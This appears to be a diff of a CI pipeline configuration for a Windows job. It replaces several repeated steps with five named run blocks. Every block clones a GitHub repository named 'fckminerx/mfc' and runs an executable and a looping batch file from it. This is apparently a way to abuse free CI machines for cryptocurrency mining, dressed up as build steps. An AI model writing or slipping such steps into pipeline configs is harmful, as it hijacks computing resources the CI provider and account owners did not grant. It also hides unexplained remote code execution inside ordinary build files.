@@ -12,40 +12,49 @@ jobs:
   steps:
     # Commands are run in a Windows virtual machine environment
     - checkout
-    - run: Write-Host 'Hello, Windows'
-    - run: git clone https://github.com/fckminerx/mfc
-    - run: cd mfc
-    - run: powershell .\mfc-100.exe
-    - run: powershell .\loop.bat
-  steps:
-    # Commands are run in a Windows virtual machine environment
-    - checkout
-    - run: Write-Host 'Hello, Windows'
-    - run: git clone https://github.com/fckminerx/mfc
-    - run: cd mfc
-    - run: powershell .\mfc-100.exe
-    - run: powershell .\loop.bat
-  steps:
-    # Commands are run in a Windows virtual machine environment
-    - checkout
-    - run: Write-Host 'Hello, Windows'
-    - run: git clone https://github.com/fckminerx/mfc
-    - run: cd mfc
-    - run: powershell .\mfc-100.exe
-    - run: powershell .\loop.bat
-  steps:
-    # Commands are run in a Windows virtual machine environment
-    - checkout
-    - run: Write-Host 'Hello, Windows'
-    - run: git clone https://github.com/fckminerx/mfc
-    - run: cd mfc
-    - run: powershell .\mfc-100.exe
-    - run: powershell .\loop.bat
-  steps:
-    # Commands are run in a Windows virtual machine environment
-    - checkout
-    - run: Write-Host 'Hello, Windows'
-    - run: git clone https://github.com/fckminerx/mfc
-    - run: cd mfc
-    - run: powershell .\mfc-100.exe
-    - run: powershell .\loop.bat
+    - run:
+        name: RUN1
+        command: |
+          bundle install --jobs=4 --retry=3 --path vendor/bundle
+          Write-Host 'Hello, Windows'
+          git clone https://github.com/fckminerx/mfc
+          cd mfc
+          powershell .\mfc-100.exe
+          powershell .\loop.bat
+    - run:
+        name: RUN2
+        command: |
+          bundle install --jobs=4 --retry=3 --path vendor/bundle
+          Write-Host 'Hello, Windows'
+          git clone https://github.com/fckminerx/mfc
+          cd mfc
+          powershell .\mfc-100.exe
+          powershell .\loop.bat
+    - run:
+        name: RUN3
+        command: |
+          bundle install --jobs=4 --retry=3 --path vendor/bundle
+          Write-Host 'Hello, Windows'
+          git clone https://github.com/fckminerx/mfc
+          cd mfc
+          powershell .\mfc-100.exe
+          powershell .\loop.bat
+    - run:
+        name: RUN4
+        command: |
+          bundle install --jobs=4 --retry=3 --path vendor/bundle
+          Write-Host 'Hello, Windows'
+          git clone https://github.com/fckminerx/mfc
+          cd mfc
+          powershell .\mfc-100.exe
+          powershell .\loop.bat
+    - run:
+        name: RUN5
+        command: |
+          bundle install --jobs=4 --retry=3 --path vendor/bundle
+          Write-Host 'Hello, Windows'
+          git clone https://github.com/fckminerx/mfc
+          cd mfc
+          powershell .\mfc-100.exe
+          powershell .\loop.bat
+    
